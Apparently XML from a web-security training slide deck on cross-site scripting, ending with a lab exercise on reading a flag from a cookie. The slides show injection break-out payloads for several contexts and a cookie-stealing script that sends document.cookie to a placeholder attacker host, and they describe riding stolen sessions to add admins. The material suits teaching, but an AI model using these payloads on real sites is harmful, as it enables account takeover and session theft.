          <p:cNvPr id="874" name="Google Shape;874;p62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2103120"/>
            <a:ext cx="10607040" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 3077"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p62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="234086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62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133856" y="234086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p62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="234086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8" name="Google Shape;878;p62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1737360" y="2176272"/>
            <a:ext cx="9326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where does your input land?</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="879" name="Google Shape;879;p62"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2633472"/>
            <a:ext cx="10607040" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="880" name="Google Shape;880;p62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2761488"/>
            <a:ext cx="10058400" cy="15544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HTML body  -&gt; &lt;div&gt;INPUT&lt;/div&gt;       -&gt; &lt;script&gt;...&lt;/script&gt;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Attribute  -&gt; &lt;input value="INPUT"&gt;   -&gt; "&gt;&lt;svg onload=...&gt;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JS string  -&gt; var x = 'INPUT';        -&gt; ';alert(1)//</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="881" name="Google Shape;881;p62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4800600"/>
            <a:ext cx="10607040" cy="10972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6EDF3"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>You cannot pick a payload until you know the context. </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Read where your input renders</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t> in the response, then choose the break-out that fits. This is exactly where blind, guessed payloads flail.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="882" name="Google Shape;882;p62"/>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p62"/>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884" name="Google Shape;884;p62"/>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61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89" name="Shape 889"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="890" name="Google Shape;890;p63"/>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200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>FROM ALERT(1) TO TAKEOVER</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="891" name="Google Shape;891;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="868680"/>
            <a:ext cx="10911535"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3800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="3800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>alert(1) proves it. Then go further.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="892" name="Google Shape;892;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1965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93" name="Google Shape;893;p63"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="2122871"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="894" name="Google Shape;894;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="1920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Prove execution</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="895" name="Google Shape;895;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="2286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alert(1) or console.log - confirm your JS runs in the victim's context.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="896" name="Google Shape;896;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3108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897" name="Google Shape;897;p63"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="3265871"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="898" name="Google Shape;898;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="3063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Steal the session</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="899" name="Google Shape;899;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="3429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Exfiltrate document.cookie (when it isn't HttpOnly) or the JWT in localStorage.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="900" name="Google Shape;900;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4251960"/>
            <a:ext cx="603504" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C2128"/>
          </a:solidFill>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="3036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901" name="Google Shape;901;p63"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="4408871"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="902" name="Google Shape;902;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="4206240"/>
            <a:ext cx="48463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600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Act as the victim</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="903" name="Google Shape;903;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="4572000"/>
            <a:ext cx="4846320" cy="75895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1250"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1250" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Ride their session: change email, add an admin, pivot deeper.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="904" name="Google Shape;904;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2194560"/>
            <a:ext cx="4800600" cy="3108960"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 235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5" name="Google Shape;905;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7022592" y="243230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6" name="Google Shape;906;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7260336" y="243230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7" name="Google Shape;907;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7498080" y="243230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8" name="Google Shape;908;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="2267712"/>
            <a:ext cx="3520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steal a session</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="909" name="Google Shape;909;p63"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2724912"/>
            <a:ext cx="4800600" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="910" name="Google Shape;910;p63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="2852928"/>
            <a:ext cx="4251960" cy="228600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778BA"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F778BA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>&lt;script&gt;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new Image().src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'https://you/x?c='</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FB950"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> + document.cookie;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778BA"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="F778BA"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</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E6EDF3"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t> </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their cookie lands in</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8B949E"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># your access log.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="911" name="Google Shape;911;p63"/>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63"/>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913" name="Google Shape;913;p63"/>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62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18" name="Shape 918"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="919" name="Google Shape;919;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="566928"/>
            <a:ext cx="9144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1" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="58A6FF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>OPTIONAL LAB</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="920" name="Google Shape;920;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="100584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FB950"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="3000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>LAB 09</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="921" name="Google Shape;921;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1627632"/>
            <a:ext cx="10911535"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6EDF3"/>
              </a:buClr>
              <a:buSzPts val="2700"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="2700" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Run code in the page</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="2700" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="922" name="Google Shape;922;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2697480"/>
            <a:ext cx="5029200" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 8000" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C2128"/>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3" name="Google Shape;923;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="281635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THE LAB</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="924" name="Google Shape;924;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="3090672"/>
            <a:ext cx="44805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8A6FF"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="58A6FF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Your lab · /lab09</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="925" name="Google Shape;925;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3749040"/>
            <a:ext cx="5029200" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 5333"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6" name="Google Shape;926;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="386791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1" i="0" lang="en-US" sz="1000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>OBJECTIVE</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="927" name="Google Shape;927;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="4142232"/>
            <a:ext cx="4480560" cy="86868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E6EDF3"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1350" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Get your input to run as JavaScript in the page, then read the flag out of the cookie it can reach.</a:t>
            </a:r>
